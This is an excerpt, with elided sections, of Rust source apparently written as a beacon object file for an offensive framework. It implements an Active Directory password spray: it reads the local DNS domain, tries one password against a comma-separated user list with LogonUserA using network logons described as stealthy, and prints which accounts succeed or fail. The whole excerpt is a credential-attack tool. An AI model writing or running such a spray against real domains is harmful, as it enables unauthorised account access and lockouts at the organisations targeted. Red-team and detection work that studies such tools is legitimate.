...
//
//! AD password spray — discovers domain via GetComputerNameExA then LogonUserA.
//!
//! Auto-discovers the DNS domain name from the local machine and uses
//! LOGON32_LOGON_NETWORK for stealthy spraying.
//!
//! Args: <password> <users_comma_separated>
//!   e.g.  Password123  user1,user2,user3
//!
...
// ComputerNameDnsDomain = 6
const COMPUTER_NAME_DNS_DOMAIN: u32 = 6;
...
fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    ...
    if password.is_empty() || users.is_empty() {
        return Err("usage: spray-ad <password> <user1,user2,...>");
    }

    // Discover DNS domain name
    let mut domain_buf = [0i8; 256];
    let mut domain_len: u32 = 255;
    let rc_dn = unsafe {
        get_computer_name_ex_a(
            COMPUTER_NAME_DNS_DOMAIN,
            domain_buf.as_mut_ptr(),
            &mut domain_len,
        )
    }.map_err(|_| "resolve failed")?;

    let domain_str = if rc_dn != 0 && domain_len > 0 {
        let end = domain_buf.iter().position(|&c| c == 0).unwrap_or(domain_len as usize);
        core::str::from_utf8(unsafe {
            core::slice::from_raw_parts(domain_buf.as_ptr() as *const u8, end)
        }).unwrap_or("WORKGROUP")
    } else {
        "WORKGROUP"
    };

    println!("[*] discovered domain: {}", domain_str);
    ...
    loop {
        ...
        if !user_slice.is_empty() {
            ...
            if ok != 0 {
                println!("[+] SUCCESS: {}\\{}", domain_str, core::str::from_utf8(user_slice).unwrap_or("?"));
                success_count += 1;
                if htoken != 0 && htoken != INVALID_HANDLE_VALUE {
                    let _ = unsafe { close_handle(htoken) };
                }
            } else {
                println!("[-] FAIL: {}\\{}", domain_str, core::str::from_utf8(user_slice).unwrap_or("?"));
                fail_count += 1;
            }
        }
